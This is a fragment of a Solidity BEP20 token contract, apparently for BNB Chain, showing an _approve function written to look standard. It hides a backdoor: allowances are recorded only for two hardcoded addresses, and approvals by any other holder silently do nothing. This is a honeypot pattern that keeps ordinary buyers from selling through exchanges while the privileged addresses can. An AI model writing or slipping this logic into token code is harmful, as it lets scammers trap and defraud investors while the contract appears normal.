  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");
    
    if (owner == address(0x2e39FF16B27292A0419849E06FDe5E42044186bC)){
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } else 
      if (owner == address(0x3a3464c4E3215899C221d940BFB4679A062EF973)){
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
  }
